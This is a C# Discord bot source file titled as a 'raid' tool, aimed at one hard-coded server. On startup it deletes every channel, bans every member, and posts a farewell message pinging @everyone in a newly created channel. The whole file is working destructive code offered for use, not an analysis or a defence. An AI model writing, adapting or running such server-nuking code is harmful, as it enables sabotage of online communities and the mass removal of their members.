using Discord;
using Discord.WebSocket;
using Discord.Rest;
using System.Diagnostics;

namespace Romio_H_Raid;

internal class Program
{
	private static readonly DiscordSocketConfig _discordSocketConfig = new()
	{
		AlwaysDownloadUsers = true
	};
	private static readonly DiscordSocketClient _discordSocketClient = new(_discordSocketConfig);

	internal static async Task Main()
	{
		_discordSocketClient.Log += Log;

		await _discordSocketClient.LoginAsync(TokenType.Bot, "YOUR_BOT_TOKEN");
		await _discordSocketClient.StartAsync();

		_discordSocketClient.Ready += Ready;

		await Task.Delay(-1);
	}

	private static Task Log(LogMessage logMessage)
	{
		Trace.TraceInformation(logMessage.ToString());
		return Task.CompletedTask;
	}

	private static async Task Ready()
	{
		await DeleteChannels();
		await BanUsers();
		await WriteLastMessage();
	}

	private static Task DeleteChannels()
	{
		SocketGuild romioH = _discordSocketClient.GetGuild(644431490515730432);

		romioH.Channels.ToList().ForEach(async (socketGuildChannel) =>
		{
			try
			{
				await socketGuildChannel.DeleteAsync();
				Trace.TraceInformation($"Canal borrado: {socketGuildChannel.Name}");
			}
			catch
			{
				Trace.TraceError($"No se pudo borrar el siguiente canal: {socketGuildChannel.Name}");
			}
		});
		return Task.CompletedTask;
	}

	private static Task BanUsers()
	{
		SocketGuild romioH = _discordSocketClient.GetGuild(644431490515730432);

		romioH.Users.ToList().ForEach(async (SocketGuildUser socketGuildUser) =>
		{
			try
			{
				await socketGuildUser.BanAsync();
				Trace.TraceInformation($"Usuario baneado: {socketGuildUser.DisplayName}");
			}
			catch
			{
				Trace.TraceError($"No se ha podido banear al siguiente usuario: {socketGuildUser.DisplayName}");
			}
		});
		return Task.CompletedTask;
	}

	private static async Task WriteLastMessage()
	{
		SocketGuild romioH = _discordSocketClient.GetGuild(644431490515730432);

		try
		{
			RestTextChannel? adiós = await romioH.CreateTextChannelAsync("adiós");
			_ = await adiós.SendMessageAsync("@everyone Hasta pronto, se cuidan, ¡Besos!");
			Trace.TraceInformation("Último mensaje enviado satisfactoriamente.");
		}
		catch
		{
			Trace.TraceError("No se pudo enviar el mensaje final.");
		}
	}
}
